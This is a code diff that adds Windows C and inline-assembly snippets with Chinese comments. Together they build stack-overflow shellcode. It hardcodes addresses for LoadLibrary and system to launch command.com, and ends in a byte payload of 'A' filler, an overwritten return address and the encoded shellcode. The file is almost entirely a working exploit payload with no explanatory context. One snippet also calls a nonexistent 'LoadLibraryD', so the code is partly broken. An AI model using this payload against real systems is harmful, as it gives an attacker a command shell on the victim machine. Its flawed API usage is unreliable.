@@ -1,0 +1,120 @@
+#include <windows.h>
+#include <winbase.h> 
+typedef void (*MYPROC)(LPTSTR);	//定义函数指针
+int main()
+{
+	HINSTANCE LibHandle;
+	MYPROC ProcAdd;
+	LibHandle = LoadLibrary("kernel32.dll");
+	ProcAdd = (MYPROC) GetProcAddress(LibHandle, "LoadLibraryD");	
+	(ProcAdd) ("msvcrt.dll");		
+      
+	return 0;
+}
+
+
+0x7c801d7b	
+
+
+
+#include <windows.h>
+#include <winbase.h> 
+typedef void (*MYPROC)(LPTSTR);	//定义函数指针
+void main()
+{
+	__asm
+	{
+	
+    push ebp    ;保存ebp,esp-4
+    mov ebp,esp    ;给ebp负值，将作为局部变量的基指针
+    xor eax,eax   ;
+    push eax;
+	push eax;
+	push eax;
+    mov byte ptr [ebp-0bh],6Dh; 
+    mov byte ptr [ebp-0ah],73h;
+    mov byte ptr [ebp-09h],76h;
+    mov byte ptr [ebp-08h],63h;
+    mov byte ptr [ebp-07h],72h;
+    mov byte ptr [ebp-06h],74h;
+    mov byte ptr [ebp-05h],2Eh;
+    mov byte ptr [ebp-04h],64h;
+    mov byte ptr [ebp-03h],6Ch;
+    mov byte ptr [ebp-02h],6Ch;
+    lea eax,[ebp-0bh]; 
+    push eax    ;
+    mov eax,0x7c801d7b;
+    call eax  ; 
+	}
+	__asm
+	{
+	
+		push ebp ;      
+		mov ebp,esp ;               
+		xor edi,edi ;
+		push edi ;压入0，esp－4,;  
+		sub esp,08h ;
+		mov byte ptr [ebp-0ch],63h ;  c
+		mov byte ptr [ebp-0bh],6fh ;  o
+		mov byte ptr [ebp-0ah],6dh ;  m
+		mov byte ptr [ebp-09h],6Dh ;  m
+		mov byte ptr [ebp-08h],61h ;  a
+		mov byte ptr [ebp-07h],6eh ;  n
+		mov byte ptr [ebp-06h],64h ;  d
+		mov byte ptr [ebp-05h],2Eh ;  .
+		mov byte ptr [ebp-04h],63h ;  c
+		mov byte ptr [ebp-03h],6fh ;  o
+		mov byte ptr [ebp-02h],6dh ;  m
+		lea eax,[ebp-0ch] ;                
+		push eax ;                            
+		mov eax, 0x77bf93c7 ;
+		call eax ;
+	}
+	
+}
+	
+  "\x41\x41\x41\x41"
+  "\x41\x41\x41\x41"
+  "\x41\x41\x41\x41"
+  "\x41\x41\x41\x41"
+  "\x12\x45\xfa\x7f"
+  "\x55"
+  "\x8B\xEC" 
+  "\x33\xC0"
+  "\x50"
+  "\x50"  
+  "\x50"
+  "\xC6\x45\xF5\x6D"
+  "\xC6\x45\xF6\x73"
+  "\xC6\x45\xF7\x76"
+  "\xC6\x45\xF8\x63" 
+  "\xC6\x45\xF9\x72"  
+  "\xC6\x45\xFA\x74"
+  "\xC6\x45\xFB\x2E" 
+  "\xC6\x45\xFC\x64"
+  "\xC6\x45\xFD\x6C" 
+  "\xC6\x45\xFE\x6C" 
+  "\x8D\x45\xF5"
+  "\x50" 
+  "\xB8\x7B\x1D\x80\x7C"
+  "\xFF\xD0"
+  "\x55"
+  "\x8B\xEC"
+  "\x33\xFF"
+  "\x57"
+  "\x83\xEC\x08" 
+  "\xC6\x45\xF4\x63"
+  "\xC6\x45\xF5\x6F"
+  "\xC6\x45\xF6\x6D" 
+  "\xC6\x45\xF7\x6D"
+  "\xC6\x45\xF8\x61"
+  "\xC6\x45\xF9\x6E"
+  "\xC6\x45\xFA\x64"
+  "\xC6\x45\xFB\x2E" 
+  "\xC6\x45\xFC\x63" 
+  "\xC6\x45\xFD\x6F" 
+  "\xC6\x45\xFE\x6D"
+  "\x8D\x45\xF4" 
+  "\x50" 
+  "\xB8\xC7\x93\xBF\x77"
+  "\xFF\xD0"
